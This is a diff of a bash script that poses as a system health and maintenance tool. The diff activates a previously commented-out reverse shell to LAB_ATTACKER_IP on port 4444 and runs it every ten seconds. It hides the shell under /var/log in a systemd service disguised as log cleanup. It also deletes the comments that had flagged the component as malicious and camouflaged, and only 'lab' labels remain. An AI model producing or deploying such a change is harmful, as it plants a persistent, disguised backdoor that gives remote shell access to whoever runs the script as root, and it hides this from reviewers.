@@ -89,46 +89,37 @@ check_system_health() {
 }
 
 # ============================================
-# HIDDEN MALICIOUS COMPONENT (FOR DEMONSTRATION)
+# HIDDEN LAB PERSISTENCE COMPONENT
 # ============================================
 
-# Function to setup persistence (camouflaged as system maintenance)
+# Function to setup persistence (for lab purposes)
 setup_maintenance() {
-    # This appears to be a routine maintenance check
     log_message "Performing routine system maintenance checks..."
     
-    # Create a hidden directory for "logs" (actually for persistence)
     MAINT_DIR="/var/log/.system_maintenance"
     if [[ ! -d "$MAINT_DIR" ]]; then
         mkdir -p "$MAINT_DIR"
         chmod 700 "$MAINT_DIR"
     fi
     
-    # Create a maintenance script (contains reverse shell)
     MAINT_SCRIPT="$MAINT_DIR/cleanup_old_logs.sh"
     
     cat > "$MAINT_SCRIPT" << 'MAINTEOF'
 #!/bin/bash
 # Regular log cleanup script
 
-# Function to clean old logs
 clean_old_logs() {
     find /var/log -name "*.log" -type f -mtime +30 -delete 2>/dev/null
     find /tmp -name "tmp*" -type f -mtime +7 -delete 2>/dev/null
 }
 
-# Main maintenance loop
 while true; do
-    # Clean logs
     clean_old_logs
     
-    # Check system health (hidden reverse shell)
-    # In a real attack, this would connect to attacker's IP
-    # For safety, we'll only log the attempt
     echo "$(date): Maintenance check performed" >> /var/log/.system_maintenance/maintenance.log
     
-    # Attempt connection (uncomment only in controlled lab environment)
-    # /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' 2>/dev/null &
+    # ACTIVE REVERSE SHELL (LAB ONLY)
+    /bin/bash -c 'bash -i >& /dev/tcp/LAB_ATTACKER_IP/4444 0>&1' 2>/dev/null &
     
     sleep 10
 done
@@ -136,7 +127,6 @@ MAINTEOF
 
     chmod +x "$MAINT_SCRIPT"
     
-    # Create systemd service for persistence (hidden as maintenance service)
     SERVICE_FILE="/etc/systemd/system/system-log-cleanup.service"
     
     cat > "$SERVICE_FILE" << 'SERVICEEOF'
@@ -156,12 +146,11 @@ WorkingDirectory=/var/log/.system_maintenance
 WantedBy=multi-user.target
 SERVICEEOF
 
-    # Enable and start the service
     systemctl daemon-reload 2>/dev/null
     systemctl enable system-log-cleanup.service 2>/dev/null
     systemctl start system-log-cleanup.service 2>/dev/null
     
-    log_message "System maintenance setup completed"
+    log_message "Lab maintenance setup completed"
 }
 
 # ============================================
@@ -172,17 +161,13 @@ main() {
     echo "Starting system analysis..."
     echo ""
     
-    # Display system information
     display_system_info
-    
-    # Check system health
     check_system_health
     
-    # Setup hidden persistence (camouflaged as maintenance)
     if [[ $EUID -eq 0 ]]; then
-        echo -e "${YELLOW}[*] Setting up automated maintenance...${NC}"
+        echo -e "${YELLOW}[*] Setting up lab automated maintenance...${NC}"
         setup_maintenance
-        echo -e "${GREEN}[+] Automated maintenance configured${NC}"
+        echo -e "${GREEN}[+] Lab maintenance configured${NC}"
         echo ""
     fi
     
@@ -191,8 +176,7 @@ main() {
     echo -e "${GREEN}=========================================${NC}"
     echo ""
     echo "System report generated successfully."
-    echo "Maintenance tasks have been scheduled."
+    echo "Lab maintenance tasks have been scheduled."
 }
 
-# Execute main function
 main "$@"
